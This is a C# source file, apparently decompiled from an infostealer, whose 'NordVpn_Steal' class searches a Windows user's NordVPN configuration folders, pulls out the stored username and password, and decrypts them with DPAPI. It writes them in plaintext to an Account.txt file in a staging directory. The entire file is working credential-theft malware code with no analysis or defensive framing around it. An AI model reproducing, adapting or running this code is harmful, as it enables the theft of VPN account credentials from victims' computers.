using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace loki.loki.Utilies.App
{
	// Token: 0x0200002D RID: 45
	public static class NordVpn_Steal
	{
		// Token: 0x06000175 RID: 373 RVA: 0x00009FB8 File Offset: 0x000081B8
		public static void Nord_Vpn_Grabber(string string_0)
		{
			Directory.CreateDirectory(string_0 + "\\Apps\\Vpn");
			using (StreamWriter streamWriter = new StreamWriter(string_0 + "\\Apps\\Vpn\\NordVPN\\Account.txt"))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "NordVPN"));
				if (directoryInfo.Exists)
				{
					DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
					for (int i = 0; i < directories.Length; i++)
					{
						foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
						{
							streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
							string text = Path.Combine(directoryInfo2.FullName, "user.config");
							if (File.Exists(text))
							{
								XmlDocument xmlDocument = new XmlDocument();
								xmlDocument.Load(text);
								string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
								string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
								if (innerText != null && !string.IsNullOrEmpty(innerText))
								{
									streamWriter.WriteLine("\t\tUsername: " + NordVpn_Steal.Nord_Vpn_Decoder(innerText));
								}
								if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
								{
									streamWriter.WriteLine("\t\tPassword: " + NordVpn_Steal.Nord_Vpn_Decoder(innerText2));
								}
							}
						}
					}
				}
			}
		}

		// Token: 0x06000176 RID: 374 RVA: 0x0000A128 File Offset: 0x00008328
		public static string Nord_Vpn_Decoder(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}
	}
}
